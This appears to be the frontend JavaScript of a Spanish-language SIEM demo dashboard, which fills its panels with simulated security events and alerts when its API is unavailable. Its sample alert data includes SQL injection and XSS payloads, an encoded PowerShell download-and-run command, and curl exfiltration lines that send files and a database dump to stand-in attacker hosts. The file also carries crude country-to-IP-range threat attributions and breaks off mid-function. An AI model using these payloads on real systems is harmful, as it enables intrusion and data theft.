/**
 * RustSIEM Dashboard - Frontend JavaScript
 * Conecta el frontend HTML/CSS con las APIs del backend de Rust
 */

class RustSIEMDashboard {
    constructor() {
        this.apiBase = window.location.origin;
        this.updateInterval = 5000; // 5 segundos
        this.eventStreamActive = true;
        this.currentPage = 'dashboard';

        // Cache de datos
        this.cachedStats = null;
        this.cachedEvents = [];
        this.cachedAlerts = [];

        // Configuración de datos simulados para demo
        this.simulatedData = {
            attackPatterns: {
                'SQL Injection': { count: 247, percentage: 65 },
                'XSS': { count: 193, percentage: 45 },
                'Brute Force': { count: 156, percentage: 35 },
                'DDoS': { count: 89, percentage: 20 }
            },
            geographicThreats: [
                { 
                    country: 'China', 
                    flag: '🇨🇳', 
                    percentage: 45, 
                    ip_ranges: ['1.0.0.0/8', '27.0.0.0/8'],
                    threat_types: ['Brute Force', 'APT', 'Espionage'],
                    known_groups: ['APT1', 'APT40', 'Winnti Group']
                },
                { 
                    country: 'Russia', 
                    flag: '🇷🇺', 
                    percentage: 23,
                    ip_ranges: ['46.0.0.0/8', '95.0.0.0/8'],
                    threat_types: ['Ransomware', 'Banking Trojans', 'APT'],
                    known_groups: ['APT28', 'APT29', 'Fancy Bear']
                },
                { 
                    country: 'North Korea', 
                    flag: '🇰🇵', 
                    percentage: 18,
                    ip_ranges: ['175.45.176.0/22'],
                    threat_types: ['Cryptocurrency Theft', 'Ransomware', 'Banking'],
                    known_groups: ['Lazarus Group', 'APT38']
                },
                { 
                    country: 'Others', 
                    flag: '🌍', 
                    percentage: 14,
                    ip_ranges: ['Various'],
                    threat_types: ['Script Kiddies', 'Automated Tools'],
                    known_groups: ['Various']
                }
            ],
            anomalies: [
                { description: 'Unusual traffic spike from 203.0.113.45', score: 'HIGH' },
                { description: 'Abnormal request pattern detected', score: 'MEDIUM' },
                { description: 'New user agent string pattern', score: 'LOW' }
            ],
            detectionRules: [
                {
                    name: 'SQL Injection Detection',
                    status: 'active',
                    description: 'Detects SQL injection patterns in HTTP requests',
                    hits: 247
                },
                {
                    name: 'XSS Attack Pattern',
                    status: 'active',
                    description: 'Identifies XSS attempts in request parameters',
                    hits: 193
                },
                {
                    name: 'Brute Force Login',
                    status: 'warning',
                    description: 'Multiple failed login attempts detection',
                    hits: 156
                },
                {
                    name: 'Admin Panel Access',
                    status: 'critical',
                    description: 'Unauthorized admin panel access attempts',
                    hits: 12
                },
                {
                    name: 'File Upload Scanner',
                    status: 'active',
                    description: 'Scans uploaded files for malicious content',
                    hits: 89
                }
            ]
        };

        this.init();
    }

    async init() {
        console.log('🛡️ Iniciando RustSIEM Dashboard...');

        // Mostrar loading inicial
        this.showLoading();

        // Configurar event listeners
        this.setupEventListeners();

        // Cargar datos iniciales
        await this.loadInitialData();

        // Iniciar actualizaciones periódicas
        this.startPeriodicUpdates();

        // Simular stream de eventos
        this.startEventStream();

        // Ocultar loading
        this.hideLoading();

        console.log('✅ RustSIEM Dashboard iniciado correctamente');
    }

    setupEventListeners() {
        // Navegación
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const page = e.currentTarget.dataset.page;
                if (page) {
                    this.navigateToPage(page);
                }
            });
        });

        // Controles del stream
        const pauseBtn = document.getElementById('pause-stream');
        const clearBtn = document.getElementById('clear-stream');

        if (pauseBtn) {
            pauseBtn.addEventListener('click', () => this.toggleEventStream());
        }

        if (clearBtn) {
            clearBtn.addEventListener('click', () => this.clearEventStream());
        }

        // Controles de eventos
        const eventsSearch = document.getElementById('events-search');
        const eventsFilter = document.getElementById('events-filter');

        if (eventsSearch) {
            eventsSearch.addEventListener('input', () => this.filterEvents());
        }

        if (eventsFilter) {
            eventsFilter.addEventListener('change', () => this.filterEvents());
        }

        // Controles de alertas
        const alertsFilter = document.getElementById('alerts-status-filter');
        const markAllReadBtn = document.getElementById('mark-all-read');

        if (alertsFilter) {
            alertsFilter.addEventListener('change', () => this.filterAlerts());
        }

        if (markAllReadBtn) {
            markAllReadBtn.addEventListener('click', () => this.markAllAlertsRead());
        }

        // Botón de agregar regla
        const addRuleBtn = document.getElementById('add-rule-btn');
        if (addRuleBtn) {
            addRuleBtn.addEventListener('click', () => this.showAddRuleModal());
        }
    }

    async loadInitialData() {
        try {
            // Cargar estadísticas
            await this.updateStats();

            // Cargar datos simulados para el dashboard
            this.loadSimulatedDashboardData();

            // Cargar eventos y alertas
            await this.loadEvents();
            await this.loadAlerts();

        } catch (error) {
            console.error('❌ Error cargando datos iniciales:', error);
            this.showError('Error cargando datos del sistema');
        }
    }

    async updateStats() {
        try {
            const response = await fetch(`${this.apiBase}/api/stats`);
            const result = await response.json();

            if (result.success) {
                this.cachedStats = result.data;
                this.displayStats(result.data);
                this.updateLastUpdatedTime();
            } else {
                throw new Error(result.message || 'Error obteniendo estadísticas');
            }
        } catch (error) {
            console.error('❌ Error actualizando estadísticas:', error);

            // Usar datos simulados si la API falla
            const simulatedStats = {
                events_per_second: 2.85 + (Math.random() * 2),
                critical_alerts: 3,
                threat_score: 7.3,
                active_sources: 12
            };
            this.displayStats(simulatedStats);
        }
    }

    displayStats(stats) {
        // Actualizar métricas principales
        this.updateElement('metric-events-per-second', (stats.events_per_second || 0).toFixed(2));
        this.updateElement('metric-critical-alerts', stats.critical_alerts || 0);
        this.updateElement('metric-threat-score', (stats.threat_score || 0).toFixed(1));
        this.updateElement('metric-active-sources', stats.active_sources || 0);

        // Actualizar barra de estado
        this.updateElement('events-per-second', (stats.events_per_second || 0).toFixed(1));
        this.updateElement('active-sources', stats.active_sources || 0);
        this.updateElement('critical-alerts-count', stats.critical_alerts || 0);

        // Actualizar uptime
        const uptime = this.formatUptime(stats.uptime_seconds || 0);
        this.updateElement('system-uptime', uptime);
    }

    loadSimulatedDashboardData() {
        // Cargar patrones de ataques
        this.loadAttackPatterns();

        // Cargar amenazas geográficas
        this.loadGeographicThreats();

        // Cargar anomalías ML
        this.loadMLAnomalies();

        // Cargar reglas de detección
        this.loadDetectionRules();
    }

    loadAttackPatterns() {
        Object.entries(this.simulatedData.attackPatterns).forEach(([pattern, data], index) => {
            const countId = pattern.toLowerCase().replace(/\s+/g, '-') + '-count';
            const progressId = pattern.toLowerCase().replace(/\s+/g, '-') + '-progress';

            this.updateElement(countId, data.count);

            setTimeout(() => {
                const progressElement = document.getElementById(progressId);
                if (progressElement) {
                    progressElement.style.width = data.percentage + '%';
                }
            }, index * 200);
        });
    }

    loadGeographicThreats() {
        const container = document.getElementById('geographic-threats-list');
        if (!container) return;

        container.innerHTML = '';

        this.simulatedData.geographicThreats.forEach(threat => {
            const threatElement = document.createElement('div');
            threatElement.className = 'threat-item enhanced';
            threatElement.innerHTML = `
                <div class="threat-country">
                    <span style="margin-right: 8px;">${threat.flag}</span>
                    <strong>${threat.country}</strong>
                </div>
                <div class="threat-details">
                    <div class="threat-percentage">${threat.percentage}%</div>
                    <div class="threat-info">
                        <div class="threat-types">Tipos: ${threat.threat_types.join(', ')}</div>
                        <div class="threat-groups">Grupos: ${threat.known_groups.join(', ')}</div>
                        <div class="threat-ips">Rangos IP: ${threat.ip_ranges.join(', ')}</div>
                    </div>
                </div>
            `;
            container.appendChild(threatElement);
        });
    }

    loadMLAnomalies() {
        const container = document.getElementById('anomaly-list');
        if (!container) return;

        container.innerHTML = '';

        this.simulatedData.anomalies.forEach(anomaly => {
            const anomalyElement = document.createElement('div');
            anomalyElement.className = 'anomaly-item';
            anomalyElement.innerHTML = `
                <div class="anomaly-description">${anomaly.description}</div>
                <div class="anomaly-score">${anomaly.score}</div>
            `;
            container.appendChild(anomalyElement);
        });
    }

    loadDetectionRules() {
        const container = document.getElementById('detection-rules-grid');
        if (!container) return;

        container.innerHTML = '';

        this.simulatedData.detectionRules.forEach(rule => {
            const ruleElement = document.createElement('div');
            ruleElement.className = 'rule-card';
            ruleElement.innerHTML = `
                <div class="rule-header">
                    <div class="rule-name">${rule.name}</div>
                    <div class="rule-status ${rule.status}">${rule.status.toUpperCase()}</div>
                </div>
                <div class="rule-description">${rule.description}</div>
                <div class="rule-stats">
                    <span>Hits: ${rule.hits}</span>
                    <span>Last Updated: 2h ago</span>
                </div>
            `;
            container.appendChild(ruleElement);
        });
    }

    async loadEvents() {
        try {
            const response = await fetch(`${this.apiBase}/api/events?limit=50`);
            const result = await response.json();

            if (result.success) {
                this.cachedEvents = result.data;
                this.displayEvents(result.data);
            } else {
                // Usar datos simulados
                this.cachedEvents = this.generateSimulatedEvents(20);
                this.displayEvents(this.cachedEvents);
            }
        } catch (error) {
            console.error('❌ Error cargando eventos:', error);
            this.cachedEvents = this.generateSimulatedEvents(20);
            this.displayEvents(this.cachedEvents);
        }
    }

    generateSimulatedEvents(count) {
        const events = [];
        const severities = ['critical', 'high', 'medium', 'low', 'info'];
        const sources = ['Apache/2.4.41', 'Nginx/1.18.0', 'OpenSSH_8.3', 'MySQL/8.0', 'pfSense Firewall'];
        const eventTypes = ['HTTP Request', 'SSH Login', 'File Access', 'SQL Query', 'Network Connection', 'XSS Attempt', 'SQL Injection', 'Brute Force'];

        for (let i = 0; i < count; i++) {
            const now = new Date();
            const timestamp = new Date(now.getTime() - Math.random() * 86400000);

            events.push({
                id: `event-${i + 1}`,
                timestamp: timestamp.toISOString(),
                severity: severities[Math.floor(Math.random() * severities.length)],
                source: sources[Math.floor(Math.random() * sources.length)],
                event_type: eventTypes[Math.floor(Math.random() * eventTypes.length)],
                description: this.generateEventDescription(),
                source_ip: this.generateRandomIP()
            });
        }

        return events.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    }

    generateEventDescription() {
        const descriptions = [
            'Ataque de inyección SQL detectado: UNION SELECT en parámetro de consulta',
            'Múltiples intentos de login fallidos desde IP sospechosa (China)',
            'Patrón de acceso a archivos inusual durante horario no laboral',
            'Intento de XSS reflejado bloqueado: <script>alert(\'XSS\')</script>',
            'Tráfico de red anómalo hacia dominios C2 conocidos',
            'Acceso no autorizado a panel de administración detectado',
            'Headers HTTP malformados indicativos de herramientas automatizadas',
            'Ataque de fuerza bruta detectado: 50+ intentos en 60 segundos',
            'Payload XSS almacenado en campo de comentarios',
            'Escáner de vulnerabilidades activado: Nmap/Nessus signature',
            'Exfiltración de datos sospechosa: transferencia masiva fuera de horario',
            'Comunicación con servidor C2 de APT28 detectada',
            'Técnica de movimiento lateral detectada: PsExec execution',
            'Indicador de persistencia: modificación de registro de Windows'
        ];
        return descriptions[Math.floor(Math.random() * descriptions.length)];
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    displayEvents(events) {
        const tbody = document.getElementById('events-table-body');
        if (!tbody) return;

        tbody.innerHTML = '';

        events.forEach(event => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${this.formatTimestamp(event.timestamp)}</td>
                <td><span class="severity-badge severity-${event.severity}">${event.severity?.toUpperCase() || 'INFO'}</span></td>
                <td>${event.source || 'Unknown'}</td>
                <td>${event.event_type || 'Unknown'}</td>
                <td class="event-description">${event.description || 'No description available'}</td>
                <td>
                    <button class="control-btn view-btn educational-view-btn" 
                            onclick="showEventEducationalDetails('${event.id}')" 
                            title="Ver análisis educativo detallado">
                        <span class="btn-icon">🎓</span>
                        View
                    </button>
                </td>
            `;
            tbody.appendChild(row);
        });
    }

    async loadAlerts() {
        try {
            const response = await fetch(`${this.apiBase}/api/alerts?limit=20`);
            const result = await response.json();

            if (result.success) {
                this.cachedAlerts = result.data;
                this.displayAlerts(result.data);
            } else {
                this.cachedAlerts = this.generateSimulatedAlerts(10);
                this.displayAlerts(this.cachedAlerts);
            }
        } catch (error) {
            console.error('❌ Error cargando alertas:', error);
            this.cachedAlerts = this.generateSimulatedAlerts(10);
            this.displayAlerts(this.cachedAlerts);
        }
    }

    generateSimulatedAlerts(count) {
        const alerts = [];
        const severities = ['critical', 'warning', 'info'];

        // TIPOS ESPECÍFICOS ORDENADOS - ESTO ES CLAVE
        const alertTypes = [
            'SQL Injection',
            'XSS Attack',
            'Brute Force',
            'APT Activity',
            'Malware',
            'Data Exfiltration',
            'C2 Communication'
        ];

        const statuses = ['active', 'acknowledged'];

        for (let i = 0; i < count; i++) {
            const now = new Date();
            const timestamp = new Date(now.getTime() - Math.random() * 3600000);
            const severity = severities[Math.floor(Math.random() * severities.length)];

            // ASIGNAR TIPO ESPECÍFICO - NO ALEATORIO
            const alertType = alertTypes[i % alertTypes.length]; // Esto garantiza diferentes tipos

            console.log(`Generando alerta ${i + 1}: ${alertType}`); // DEBUG

            alerts.push({
                id: `alert-${i + 1}`,
                timestamp: timestamp.toISOString(),
                severity: severity,
                alert_type: alertType, // TIPO ESPECÍFICO
                description: this.generateAlertDescriptionForType(alertType), // DESCRIPCIÓN ESPECÍFICA
                status: statuses[Math.floor(Math.random() * statuses.length)],
                source_ip: this.generateRandomIP(),
                confidence: 0.7 + (Math.random() * 0.3),
                source_country: this.getRandomCountry(),
                target_system: this.getRandomTargetSystem(),
                attack_vector: this.getAttackVector(alertType),
                payload: this.getPayloadForType(alertType),
                mitre_techniques: this.getMitreTechniques(alertType)
            });
        }

        return alerts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    }

    generateAlertDescription() {
        const descriptions = [
            'Inyección SQL de alta confianza detectada desde IP 203.0.113.45 (China) - Técnica: UNION SELECT',
            'Múltiples intentos de XSS bloqueados desde Rusia - Posible ataque dirigido usando payloads de APT28',
            'Ataque de fuerza bruta SSH detectado: 250+ intentos desde botnet Mirai - Recomendar bloqueo inmediato',
            'Actividad APT detectada: movimiento lateral usando PsExec desde sistema comprometido',
            'Exfiltración de datos sospechosa: 2.3GB transferidos a servidor C2 durante horario no laboral',
            'Firma de malware Lazarus Group detectada en archivo ejecutable cargado',
            'Comunicación con dominio C2 conocido: malicious-c2.example.com (APT29)',
            'Patrón de User-Agent sospechoso: indicativo de herramientas automatizadas de reconocimiento',
            'Anomalía ML detectada: comportamiento de usuario anómalo - acceso masivo a bases de datos',
            'Técnica MITRE T1190 detectada: explotación de aplicación web pública',
            'Persistencia detectada: modificación de clave de registro de inicio de Windows',
            'Escalada de privilegios: intento de acceso a /etc/shadow desde usuario no privilegiado'
        ];
        return descriptions[Math.floor(Math.random() * descriptions.length)];
    }
    generateAlertDescriptionForType(alertType) {
        const descriptions = {
            'SQL Injection': [
                'Inyección SQL de alta confianza detectada desde IP sospechosa - Técnica: UNION SELECT',
                'Intento de inyección SQL bloqueado: Payload UNION en parámetro de consulta',
                'Ataque SQL injection detectado: Comentarios SQL maliciosos en formulario'
            ],
            'XSS Attack': [
                'Múltiples intentos de XSS bloqueados - Posible ataque dirigido usando payloads avanzados',
                'Script malicioso detectado en campo de entrada: <script>alert(document.cookie)</script>',
                'Ataque XSS reflejado bloqueado: Intento de robo de cookies de sesión'
            ],
            'Brute Force': [
                'Ataque de fuerza bruta SSH detectado: 250+ intentos - Recomendar bloqueo inmediato',
                'Múltiples intentos de login fallidos desde IP conocida por ataques previos',
                'Patrón de fuerza bruta detectado: 15 intentos por minuto desde botnet'
            ],
            'APT Activity': [
                'Actividad APT detectada: movimiento lateral usando PsExec desde sistema comprometido',
                'Técnicas de APT28 identificadas: Uso de herramientas legítimas para propósitos maliciosos',
                'Persistencia avanzada detectada: Modificaciones al registro y servicios del sistema'
            ],
            'Malware': [
                'Firma de malware Lazarus Group detectada en archivo ejecutable cargado',
                'Comportamiento malicioso detectado: Comunicación con dominios C2 conocidos',
                'Análisis de sandbox positivo: Archivo con comportamiento de ransomware'
            ],
            'Data Exfiltration': [
                'Exfiltración de datos sospechosa: 2.3GB transferidos fuera de horario laboral',
                'Transferencia masiva detectada hacia servidor externo no autorizado',
                'Patrón de exfiltración identificado: Compresión y cifrado de datos sensibles'
            ],
            'C2 Communication': [
                'Comunicación con dominio C2 conocido detectada: evil-c2.example.com',
                'Tráfico de beacon periódico hacia infraestructura de comando y control',
                'DNS tunneling detectado: Comunicación encubierta con servidor C2'
            ]
        };

        const typeDescriptions = descriptions[alertType] || ['Actividad sospechosa detectada'];
        return typeDescriptions[Math.floor(Math.random() * typeDescriptions.length)];
    }

    getRandomCountry() {
        const countries = ['China', 'Russia', 'North Korea', 'Iran', 'United States', 'Germany', 'Brazil', 'India'];
        return countries[Math.floor(Math.random() * countries.length)];
    }

    getRandomTargetSystem() {
        const systems = ['web-server-01.company.com', 'db-server-02.company.com', 'mail-server.company.com', 'ftp-server.company.com', 'api-gateway.company.com'];
        return systems[Math.floor(Math.random() * systems.length)];
    }

    getAttackVector(alertType) {
        const vectors = {
            'SQL Injection': ['HTTP POST /login.php', 'HTTP GET /search.php', 'HTTP POST /admin/users.php'],
            'XSS Attack': ['HTTP POST /comment.php', 'HTTP GET /profile.php', 'HTTP POST /contact.php'],
            'Brute Force': ['SSH Port 22', 'RDP Port 3389', 'FTP Port 21', 'HTTP POST /admin/login'],
            'APT Activity': ['SMB/CIFS Protocol', 'WMI Remote Commands', 'PowerShell Remoting'],
            'Malware': ['Email Attachment', 'HTTP Download', 'USB Device'],
            'Data Exfiltration': ['HTTPS Upload', 'DNS Tunneling', 'FTP Transfer'],
            'C2 Communication': ['HTTPS Beacon', 'DNS Queries', 'IRC Channel']
        };
        const typeVectors = vectors[alertType] || ['Unknown Vector'];
        return typeVectors[Math.floor(Math.random() * typeVectors.length)];
    }

    etPayloadForType(alertType) {
        console.log('Getting payload for type:', alertType); // DEBUG

        const payloads = {
            'SQL Injection': [
                "' UNION SELECT username,password FROM users--",
                "'; DROP TABLE sessions;--",
                "' OR '1'='1'--",
                "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT database())))--"
            ],
            'XSS Attack': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "javascript:void(0)/*-/*`/*\\`/*'/*\\\"/**/(/* */onerror=alert('XSS') )//",
                "<svg onload=alert('XSS')></svg>"
            ],
            'Brute Force': [
                "admin:password123",
                "root:123456",
                "administrator:admin",
                "user:password"
            ],
            'APT Activity': [
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
                "rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c powershell",
                "schtasks /create /tn 'UpdateTask' /tr 'powershell.exe -windowstyle hidden'"
            ],
            'Malware': [
                "SHA256: a1b2c3d4e5f6789012345678901234567890123456789012345678901234567890",
                "File: malicious.exe detected with Lazarus Group signature",
                "Registry modification: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            ],
            'Data Exfiltration': [
                "tar -czf /tmp/data.tar.gz /home/user/documents && curl -F file=@/tmp/data.tar.gz http://attacker.com/upload",
                "mysqldump -u root -p database_name | curl -X POST -d @- http://evil.com/data"
            ],
            'C2 Communication': [
                "GET /beacon?id=12345&status=alive HTTP/1.1\\nHost: malicious-c2.example.com",
                "DNS Query: 1234567890abcdef.malicious-domain.com"
            ]
        };

        const typePayloads = payloads[alertType] || ['No payload detected'];
        const selectedPayload = typePayloads[Math.floor(Math.random() * typePayloads.length)];

        console.log('Selected payload for', alertType, ':', selectedPayload); // DEBUG

        return selectedPayload;
    }

    getMitreTechniques(alertType) {
        const techniques = {
            'SQL Injection': ['T1190 - Exploit Public-Facing Application'],
            'XSS Attack': ['T1190 - Exploit Public-Facing Application', 'T1055 - Process Injection'],
            'Brute Force': ['T1110 - Brute Force', 'T1078 - Valid Accounts'],
            'APT Activity': ['T1021 - Remote Services', 'T1078 - Valid Accounts', 'T1105 - Ingress Tool Transfer'],
            'Malware': ['T1204 - User Execution', 'T1547 - Boot or Logon Autostart Execution', 'T1055 - Process Injection'],
            'Data Exfiltration': ['T1041 - Exfiltration Over C2 Channel', 'T1005 - Data from Local System', 'T1020 - Automated Exfiltration'],
            'C2 Communication': ['T1071 - Application Layer Protocol', 'T1090 - Proxy', 'T1095 - Non-Application Layer Protocol']
        };
        return techniques[alertType] || ['T1000 - Unknown Technique'];
    }

    getPayloadForType(alertType) {
        console.log(`💻 DEBUG: Getting payload for type: "${alertType}"`);

        const payloads = {
            'SQL Injection': [
                "' UNION SELECT username,password FROM users--",
                "'; DROP TABLE sessions;--",
                "' OR '1'='1'--",
                "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT database())))--"
            ],
            'XSS Attack': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "javascript:void(0)/*-/*`/*\\`/*'/*\\\"/**/(/* */onerror=alert('XSS') )//",
                "<svg onload=alert('XSS')></svg>"
            ],
            'Brute Force': [
                "admin:password123",
                "root:123456",
                "administrator:admin",
                "user:password"
            ],
            'APT Activity': [
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
                "rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c powershell",
                "schtasks /create /tn 'UpdateTask' /tr 'powershell.exe -windowstyle hidden'"
            ],
            'Malware': [
                "SHA256: a1b2c3d4e5f6789012345678901234567890123456789012345678901234567890",
                "File: malicious.exe detected with Lazarus Group signature",
                "Registry modification: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            ],
            'Data Exfiltration': [
                "tar -czf /tmp/data.tar.gz /home/user/documents && curl -F file=@/tmp/data.tar.gz http://attacker.com/upload",
                "mysqldump -u root -p database_name | curl -X POST -d @- http://evil.com/data",
                "7z a -p'password' archive.7z C:\\Users\\*\\Documents\\*.pdf"
            ],
            'C2 Communication': [
                "GET /beacon?id=12345&status=alive HTTP/1.1\\nHost: malicious-c2.example.com",
                "DNS Query: 1234567890abcdef.malicious-domain.com",
                "IRC PRIVMSG #control :STATUS_REPORT_READY"
            ]
        };

        const typePayloads = payloads[alertType] || ['No payload detected'];
        const selectedPayload = typePayloads[Math.floor(Math.random() * typePayloads.length)];

        console.log(`🎯 DEBUG: Selected payload for ${alertType}: "${selectedPayload}"`);
        return selectedPayload;
    }

    displayAlerts(alerts) {
        const container = document.getElementById('alerts-container');
        if (!container) return;

        container.innerHTML = '';

        console.log(`🏗️ DEBUG: Displaying ${alerts.length} alerts`);

        if (alerts.length === 0) {
            container.innerHTML = `
            <div class="placeholder-content">
                <span class="placeholder-icon">✅</span>
                <h3>No Active Alerts</h3>
                <p>All systems are operating normally.</p>
            </div>
        `;
            return;
        }

        alerts.forEach((alert, index) => {
            console.log(`🎨 DEBUG: Creating alert ${index + 1}: ${alert.alert_type} (ID: ${alert.id})`);

            const alertElement = document.createElement('div');
            alertElement.className = `alert-item ${alert.severity}`;
            alertElement.innerHTML = `
            <div class="alert-header">
                <div class="alert-title">
                    <span class="severity-badge severity-${alert.severity}">${alert.severity?.toUpperCase() || 'INFO'}</span>
                    ${alert.alert_type || 'Security Alert'}
                </div>
                <div class="alert-timestamp">${this.formatTimestamp(alert.timestamp)}</div>
            </div>
            <div class="alert-description">${alert.description || 'No description available'}</div>
            <div class="alert-actions">
                <button class="control-btn small" onclick="console.log('🖱️ DEBUG: Acknowledge clicked for ${alert.id}'); dashboard.acknowledgeAlert('${alert.id}')">
                    <span class="btn-icon">✅</span>
                    Acknowledge
                </button>
                <button class="control-btn small" onclick="console.log('🖱️ DEBUG: Details clicked for ${alert.id} (${alert.alert_type})'); dashboard.viewAlertDetails('${alert.id}')">
                    <span class="btn-icon">👁️</span>
                    Details
                </button>
            </div>
        `;
            container.appendChild(alertElement);
        });

        console.log(`✅ DEBUG: Successfully displayed all ${alerts.length} alerts`);
    }


    startEventStream() {
        const streamContainer = document.getElementById('event-stream');
        if (!streamContainer) return;

        setInterval(() => {
            if (!this.eventStreamActive) return;

            this.addEventToStream(this.generateRandomStreamEvent());
        }, 2000 + Math.random() * 3000);
    }

    generateRandomStreamEvent() {
        const now = new Date();
        const severities = ['CRITICAL', 'WARNING', 'INFO'];
        const severity = severities[Math.floor(Math.random() * severities.length)];
        const descriptions = [
            'SQL injection attempt from 192.168.1.100',
            'User authentication successful',
            'Multiple failed login attempts detected',
            'XSS attack blocked: script>alert(1)</script>',
            'Anomalous traffic pattern detected',
            'File upload scanner: clean file detected',
            'GET /api/users/profile HTTP/1.1 200',
            'Brute force attack: 15 attempts in 60 seconds'
        ];

        return {
            timestamp: now.toISOString(),
            severity: severity,
            description: descriptions[Math.floor(Math.random() * descriptions.length)],
            source: ['Apache', 'Nginx', 'SSH', 'WAF'][Math.floor(Math.random() * 4)]
        };
    }

    addEventToStream(event) {
        const streamContainer = document.getElementById('event-stream');
        if (!streamContainer) return;

        // Remover placeholder si existe
        const placeholder = streamContainer.querySelector('.stream-placeholder');
        if (placeholder) {
            placeholder.remove();
        }

        const eventElement = document.createElement('div');
        eventElement.className = 'stream-event';
        eventElement.innerHTML = `
            <span class="stream-timestamp">${this.formatTime(event.timestamp)}</span>
            <span class="stream-severity stream-${event.severity.toLowerCase()}">${event.severity}</span>
            <span class="stream-description">${event.description}</span>
            <span class="stream-source">${event.source}</span>
        `;

        eventElement.style.cssText = `
            padding: 8px 0;
            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
            animation: slideInUp 0.3s ease-out;
            font-size: 0.85rem;
            display: grid;
            grid-template-columns: 80px 80px 1fr 80px;
            gap: 12px;
            align-items: center;
        `;

        streamContainer.insertBefore(eventElement, streamContainer.firstChild);

        // Mantener solo los últimos 50 eventos
        const events = streamContainer.querySelectorAll('.stream-event');
        if (events.length > 50) {
            events[events.length - 1].remove();
        }

        // Scroll al top para mostrar el nuevo evento
        streamContainer.scrollTop = 0;
    }

    toggleEventStream() {
        this.eventStreamActive = !this.eventStreamActive;
        const btn = document.getElementById('pause-stream');
        if (btn) {
            btn.innerHTML = this.eventStreamActive ?
                '<span class="btn-icon">⏸️</span> Pause' :
                '<span class="btn-icon">▶️</span> Resume';
        }
    }

    clearEventStream() {
        const streamContainer = document.getElementById('event-stream');
        if (streamContainer) {
            streamContainer.innerHTML = `
                <div class="stream-placeholder">
                    <span class="placeholder-icon">📡</span>
                    <span>Event stream cleared...</span>
                </div>
            `;
        }
    }

    navigateToPage(pageName) {
        // Actualizar navegación activa
        document.querySelectorAll('.nav-link').forEach(link => {
            link.classList.remove('active');
        });
        document.querySelector(`[data-page="${pageName}"]`).classList.add('active');

        // Mostrar página correspondiente
        document.querySelectorAll('.page-content').forEach(page => {
            page.classList.remove('active');
        });
        document.getElementById(`${pageName}-page`).classList.add('active');

        this.currentPage = pageName;

        // Cargar datos específicos de la página
        if (pageName === 'events') {
            this.loadEvents();
        } else if (pageName === 'alerts') {
            this.loadAlerts();
        } else if (pageName === 'threat-hunt') {
            this.loadThreatHuntingData();
        }
    }

    startPeriodicUpdates() {
        setInterval(() => {
            this.updateStats();

            // Actualizar ML training progress
            this.updateMLTrainingProgress();
        }, this.updateInterval);
    }

    updateMLTrainingProgress() {
        const progressElement = document.getElementById('ml-training-progress');
        const percentElement = document.getElementById('ml-training-percent');

        if (progressElement && percentElement) {
            const currentPercent = parseInt(percentElement.textContent) || 80;
            const newPercent = Math.min(100, currentPercent + Math.random() * 2);

            progressElement.style.width = newPercent + '%';
            percentElement.textContent = Math.floor(newPercent) + '%';

            if (newPercent >= 100) {
                document.getElementById('ml-model-status').textContent = 'ACTIVE';
                document.querySelector('.progress-text').textContent = 'Model training completed. Monitoring for anomalies...';
            }
        }
    }

    // Utility functions
    updateElement(id, value) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = value;
        }
    }

    formatTimestamp(timestamp) {
        if (!timestamp) return '--';
        const date = new Date(timestamp);
        return date.toLocaleString('es-ES', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    }

    formatTime(timestamp) {
        if (!timestamp) return '--';
        const date = new Date(timestamp);
        return date.toLocaleTimeString('es-ES', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    }

    formatUptime(seconds) {
        if (!seconds) return '00:00:00';
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    updateLastUpdatedTime() {
        const now = new Date();
        this.updateElement('last-updated-time', now.toLocaleString('es-ES', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit'
        }));
    }

    showLoading() {
        const overlay = document.getElementById('loading-overlay');
        if (overlay) {
            overlay.classList.remove('hidden');
        }
    }

    hideLoading() {
        const overlay = document.getElementById('loading-overlay');
        if (overlay) {
            setTimeout(() => {
                overlay.classList.add('hidden');
            }, 1000);
        }
    }

    showError(message) {
        console.error('Error:', message);
        // Aquí podrías agregar una notificación toast
    }

    // Event handlers para acciones específicas
    viewEventDetails(eventId) {
        console.log('Viewing event details for:', eventId);
        // Implementar modal o página de detalles
    }

    acknowledgeAlert(alertId) {
        console.log('Acknowledging alert:', alertId);
        // Aquí harías una llamada PUT/POST al backend
    }

    viewAlertDetails(alertId) {
        console.log(`🔍 DEBUG: Viewing alert details for ID: "${alertId}"`);
        console.log(`📋 DEBUG: Total cached alerts: ${this.cachedAlerts.length}`);

        // Logging detallado de todas las alertas
        this.cachedAlerts.forEach((alert, index) => {
